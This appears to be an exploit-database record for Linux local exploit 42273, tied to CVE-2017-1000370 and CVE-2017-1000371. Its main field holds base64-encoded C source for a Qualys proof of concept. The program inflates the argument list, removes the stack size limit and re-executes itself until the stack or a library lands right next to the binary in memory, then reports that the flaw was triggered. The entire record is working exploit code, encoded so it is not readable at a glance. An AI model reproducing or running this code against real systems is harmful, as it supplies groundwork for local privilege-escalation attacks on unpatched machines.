{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIExpbnV4X29mZnNldDJsaWIuYyBmb3IgQ1ZFLTIwMTctMTAwMDM3MCBhbmQgQ1ZFLTIwMTctMTAwMDM3MQ0KICogQ29weXJpZ2h0IChDKSAyMDE3IFF1YWx5cywgSW5jLg0KICoNCiAqIFRoaXMgcHJvZ3JhbSBpcyBmcmVlIHNvZnR3YXJlOiB5b3UgY2FuIHJlZGlzdHJpYnV0ZSBpdCBhbmQvb3IgbW9kaWZ5DQogKiBpdCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGFzIHB1Ymxpc2hlZCBieQ0KICogdGhlIEZyZWUgU29mdHdhcmUgRm91bmRhdGlvbiwgZWl0aGVyIHZlcnNpb24gMyBvZiB0aGUgTGljZW5zZSwgb3INCiAqIChhdCB5b3VyIG9wdGlvbikgYW55IGxhdGVyIHZlcnNpb24uDQogKg0KICogVGhpcyBwcm9ncmFtIGlzIGRpc3RyaWJ1dGVkIGluIHRoZSBob3BlIHRoYXQgaXQgd2lsbCBiZSB1c2VmdWwsDQogKiBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZg0KICogTUVSQ0hBTlRBQklMSVRZIG9yIEZJVE5FU1MgRk9SIEEgUEFSVElDVUxBUiBQVVJQT1NFLiAgU2VlIHRoZQ0KICogR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgZm9yIG1vcmUgZGV0YWlscy4NCiAqDQogKiBZb3Ugc2hvdWxkIGhhdmUgcmVjZWl2ZWQgYSBjb3B5IG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZQ0KICogYWxvbmcgd2l0aCB0aGlzIHByb2dyYW0uICBJZiBub3QsIHNlZSA8aHR0cDovL3d3dy5nbnUub3JnL2xpY2Vuc2VzLz4uDQogKi8NCg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jbHVkZSA8ZmNudGwuaD4NCiNpbmNsdWRlIDxsaW1pdHMuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHN5cy9yZXNvdXJjZS5oPg0KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+DQojaW5jbHVkZSA8c3lzL3RpbWUuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KDQojZGVmaW5lIGRpZSgpIGRvIHsgXA0KICAgIGZwcmludGYoc3RkZXJyLCAiZGllZCBpbiAlczogJXVcbiIsIF9fZnVuY19fLCBfX0xJTkVfXyk7IFwNCiAgICBleGl0KEVYSVRfRkFJTFVSRSk7IFwNCn0gd2hpbGUgKDApDQoNCiNkZWZpbmUgTUFYX1NUQUNLX1NJWkUgKChzaXplX3QpMTw8MzApDQojZGVmaW5lIE1BWF9BUkdfU1RSTEVOICgoc2l6ZV90KTEyODw8MTApDQojZGVmaW5lIE1JTl9BUkdDIDEwMjQNCg0Kc3RhdGljIHZvaWQNCmFuYWx5emVfbWFwcGluZ3MoY29uc3QgY2hhciAqIGNvbnN0IGJpbmFyeSkNCnsNCiAgICBpZiAoIWJpbmFyeSkgZGllKCk7DQogICAgaWYgKHN0cmNocihiaW5hcnksICcgJykpIGRpZSgpOw0KICAgIGludCBydmFsID0gRVhJVF9GQUlMVVJFOw0KICAgIGludCBkdW1wID0gMDsNCg0KICAgIGNvbnN0IGludCBmZCA9IG9wZW4oIi9wcm9jL3NlbGYvbWFwcyIsIE9fUkRPTkxZKTsNCiAgICBpZiAoZmQgPD0gLTEpIGRpZSgpOw0KDQogICAgc3RhdGljIGNoYXIgYnVmWzQwOTZdID0gIiAiOw0KICAgIGNoYXIgKiBjcCA9IGJ1ZjsNCiAgICBmb3IgKDs7KSB7DQogICAgICAgIGlmIChjcCA+PSBidWYgKyBzaXplb2YoYnVmKSkgZGllKCk7DQogICAgICAgIGNvbnN0IHNzaXplX3QgbnIgPSByZWFkKGZkLCBjcCwgYnVmICsgc2l6ZW9mKGJ1ZikgLSBjcCk7DQogICAgICAgIGlmIChuciA8PSAwKSB7DQogICAgICAgICAgICBpZiAobnIgPT0gMCkgYnJlYWs7DQogICAgICAgICAgICBpZiAobnIgIT0gLTEpIGRpZSgpOw0KICAgICAgICAgICAgaWYgKGVycm5vICE9IEVBR0FJTiAmJiBlcnJubyAhPSBFSU5UUikgZGllKCk7DQogICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgfQ0KICAgICAgICBjcCArPSBucjsNCiAgICB9DQogICAgKmNwID0gJ1wwJzsNCiAgICBpZiAobWVtY2hyKGJ1ZiwgJ1wwJywgc2l6ZW9mKGJ1ZikpICE9IGNwKSBkaWUoKTsNCg0KICAgIHNpemVfdCBoaV9iaW4gPSAwOw0KICAgIHNpemVfdCBsb19saWIgPSAwOw0KICAgIHNpemVfdCBsb19oZWFwID0gMDsNCiAgICBzaXplX3QgbG9fc3RhY2sgPSAwOw0KICAgIGNvbnN0IGNoYXIgKiBsaW5lID0gYnVmOw0KICAgIGZvciAoOzspIHsNCiAgICAgICAgY2hhciAqIGNvbnN0IG5sID0gc3RyY2hyKGxpbmUsICdcbicpOw0KICAgICAgICBpZiAoIW5sKSBkaWUoKTsNCiAgICAgICAgKm5sID0gJ1wwJzsNCg0KICAgICAgICBjcCA9IE5VTEw7DQogICAgICAgIGNvbnN0IHNpemVfdCBsbyA9IHN0cnRvdWwobGluZSwgJmNwLCAxNik7DQogICAgICAgIGlmIChjcCA8PSBsaW5lIHx8ICpjcCAhPSAnLScpIGRpZSgpOw0KICAgICAgICBpZiAobG8gPD0gMCkgZGllKCk7DQoNCiAgICAgICAgbGluZSA9IGNwICsgMTsNCiAgICAgICAgY3AgPSBOVUxMOw0KICAgICAgICBjb25zdCBzaXplX3QgaGkgPSBzdHJ0b3VsKGxpbmUsICZjcCwgMTYpOw0KICAgICAgICBpZiAoY3AgPD0gbGluZSB8fCAqY3AgIT0gJyAnKSBkaWUoKTsNCiAgICAgICAgaWYgKGhpIDw9IGxvKSBkaWUoKTsNCg0KICAgICAgICBjcCA9IHN0cnJjaHIoY3AgKyAxLCAnICcpOw0KICAgICAgICBpZiAoIWNwKSBkaWUoKTsNCiAgICAgICAgY3ArKzsNCg0KICAgICAgICBpZiAoIXN0cmNtcChjcCwgYmluYXJ5KSkgew0KICAgICAgICAgICAgaGlfYmluID0gaGk7DQogICAgICAgICAgICBpZiAobG8gPT0gMHgwODA0ODAwMCkgew0KICAgICAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAiUGxlYXNlIHJlY29tcGlsZSB3aXRoIC1mcGllIC1waWVcbiIpOw0KICAgICAgICAgICAgICAgIGRpZSgpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2UgaWYgKCFzdHJjbXAoY3AsICJbaGVhcF0iKSkgew0KICAgICAgICAgICAgaWYgKCFsb19oZWFwKSBsb19oZWFwID0gbG87DQogICAgICAgICAgICBlbHNlIHsNCiAgICAgICAgICAgICAgICBpZiAobG9fc3RhY2spIGRpZSgpOw0KICAgICAgICAgICAgICAgIGxvX3N0YWNrID0gbG87DQogICAgICAgICAgICAgICAgZHVtcCA9IDE7DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSBpZiAoIXN0cmNtcChjcCwgIltzdGFja10iKSkgew0KICAgICAgICAgICAgaWYgKCFsb19zdGFjaykgbG9fc3RhY2sgPSBsbzsNCiAgICAgICAgICAgIGVsc2Ugew0KICAgICAgICAgICAgICAgIGRpZSgpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2UgaWYgKCpjcCA9PSAnLycpIHsNCiAgICAgICAgICAgIGlmICghbG9fbGliKSBsb19saWIgPSBsbzsNCiAgICAgICAgfQ0KDQogICAgICAgICpubCA9ICdcbic7DQogICAgICAgIGxpbmUgPSBubCArIDE7DQogICAgICAgIGlmICgqbGluZSA9PSAnXDAnKSBicmVhazsNCiAgICB9DQogICAgaWYgKCFoaV9iaW4pIGRpZSgpOw0KICAgIGlmICghbG9fbGliKSBkaWUoKTsNCiAgICBpZiAoIWxvX3N0YWNrKSB7DQogICAgICAgIGlmICghbG9faGVhcCkgZGllKCk7DQogICAgICAgIGxvX3N0YWNrID0gbG9faGVhcDsNCiAgICAgICAgbG9faGVhcCA9IDA7DQogICAgfQ0KDQogICAgaWYgKGhpX2JpbiA8PSBsb19saWIgJiYgbG9fbGliIC0gaGlfYmluIDw9IDQwOTYpIHsNCiAgICAgICAgZnByaW50ZihzdGRlcnIsICJDVkUtMjAxNy0xMDAwMzcwIHRyaWdnZXJlZFxuIik7DQogICAgICAgIHJ2YWwgPSBFWElUX1NVQ0NFU1M7DQogICAgICAgIGR1bXAgPSAxOw0KICAgIH0NCiAgICBpZiAoaGlfYmluIDw9IGxvX3N0YWNrICYmIGxvX3N0YWNrIC0gaGlfYmluIDw9IDQwOTYpIHsNCiAgICAgICAgZnByaW50ZihzdGRlcnIsICJDVkUtMjAxNy0xMDAwMzcxIHRyaWdnZXJlZFxuIik7DQogICAgICAgIHJ2YWwgPSBFWElUX1NVQ0NFU1M7DQogICAgICAgIGR1bXAgPSAxOw0KICAgIH0NCiAgICBpZiAoZHVtcCkgew0KICAgICAgICBjb25zdCBzc2l6ZV90IGxlbiA9IHN0cmxlbihidWYpOw0KICAgICAgICBpZiAobGVuIDw9IDApIGRpZSgpOw0KICAgICAgICBpZiAod3JpdGUoU1RERVJSX0ZJTEVOTywgYnVmLCBsZW4pICE9IGxlbikgZGllKCk7DQogICAgfQ0KICAgIGlmIChjbG9zZShmZCkpIGRpZSgpOw0KICAgIGV4aXQocnZhbCk7DQp9DQoNCmludA0KbWFpbihjb25zdCBpbnQgbXlfYXJnYywgY29uc3QgY2hhciAqIGNvbnN0IG15X2FyZ3ZbXSkNCnsNCiAgICBpZiAobXlfYXJnYyA+PSBNSU5fQVJHQykgew0KICAgICAgICBhbmFseXplX21hcHBpbmdzKCpteV9hcmd2KTsNCiAgICAgICAgZGllKCk7DQogICAgfQ0KDQogICAgc2l6ZV90IHN0YWNrX3NpemUgPSBNQVhfU1RBQ0tfU0laRTsNCiAgICBpZiAobXlfYXJnYyA9PSAyKSBzdGFja19zaXplID0gc3RydG91bChteV9hcmd2WzFdLCBOVUxMLCAwKTsNCiAgICBlbHNlIGlmIChteV9hcmdjICE9IDEpIGRpZSgpOw0KICAgIGlmIChzdGFja19zaXplID4gTUFYX1NUQUNLX1NJWkUpIGRpZSgpOw0KDQogICAgc3RhdGljIGNoYXIgYXJnW01BWF9BUkdfU1RSTEVOXSA9ICIgIjsNCiAgICBtZW1zZXQoYXJnLCAnICcsIHNpemVvZihhcmcpLTEpOw0KDQogICAgY29uc3Qgc2l6ZV90IGFyZ2MgPSAxICsgc3RhY2tfc2l6ZSAvIChzaXplb2YoYXJnKSArIHNpemVvZihjaGFyICopKTsNCiAgICBpZiAoYXJnYyA8IE1JTl9BUkdDKSBkaWUoKTsNCg0KICAgIGNoYXIgKiogY29uc3QgYXJndiA9IGNhbGxvYyhhcmdjICsgMSwgc2l6ZW9mKGNoYXIgKikpOw0KICAgIGlmICghYXJndikgZGllKCk7DQoNCiAgICBjaGFyICogY29uc3QgYmluYXJ5ID0gcmVhbHBhdGgoKm15X2FyZ3YsIE5VTEwpOw0KICAgIGlmICghYmluYXJ5KSBkaWUoKTsNCiAgICAqYXJndiA9IGJpbmFyeTsNCg0KICAgIHNpemVfdCBpOw0KICAgIGZvciAoaSA9IDE7IGkgPCBhcmdjOyBpKyspIGFyZ3ZbaV0gPSBhcmc7DQogICAgaWYgKGkgIT0gYXJnYykgZGllKCk7DQogICAgaWYgKGFyZ3ZbaV0pIGRpZSgpOw0KDQogICAgZm9yIChpID0gMTsgaTsgaSsrKSB7DQogICAgICAgIGZwcmludGYoc3RkZXJyLCAiUnVuICMlenUuLi5cbiIsIGkpOw0KICAgICAgICBjb25zdCBwaWRfdCBwaWQgPSBmb3JrKCk7DQogICAgICAgIGlmIChwaWQgPD0gLTEpIGRpZSgpOw0KICAgICAgICBpZiAocGlkID09IDApIHsNCiAgICAgICAgICAgIHN0YXRpYyBjb25zdCBzdHJ1Y3QgcmxpbWl0IHN0YWNrX2xpbWl0ID0geyBSTElNX0lORklOSVRZLCBSTElNX0lORklOSVRZIH07DQogICAgICAgICAgICBpZiAoc2V0cmxpbWl0KFJMSU1JVF9TVEFDSywgJnN0YWNrX2xpbWl0KSkgZGllKCk7DQogICAgICAgICAgICBleGVjdmUoKmFyZ3YsIGFyZ3YsIE5VTEwpOw0KICAgICAgICAgICAgZGllKCk7DQogICAgICAgIH0NCiAgICAgICAgaW50IHN0YXR1cyA9IDA7DQogICAgICAgIGlmICh3YWl0cGlkKHBpZCwgJnN0YXR1cywgV1VOVFJBQ0VEKSAhPSBwaWQpIGRpZSgpOw0KICAgICAgICBpZiAoIVdJRkVYSVRFRChzdGF0dXMpKSBkaWUoKTsNCiAgICAgICAgaWYgKFdFWElUU1RBVFVTKHN0YXR1cykgPT0gRVhJVF9TVUNDRVNTKSBjb250aW51ZTsNCiAgICAgICAgaWYgKFdFWElUU1RBVFVTKHN0YXR1cykgIT0gRVhJVF9GQUlMVVJFKSBkaWUoKTsNCiAgICB9DQogICAgZGllKCk7DQp9", 
    "filename": "platforms/lin_x86/local/42273.c", 
    "id": "42273", 
    "cves": [
        "CVE-2017-1000371", 
        "CVE-2017-1000370"
    ]
}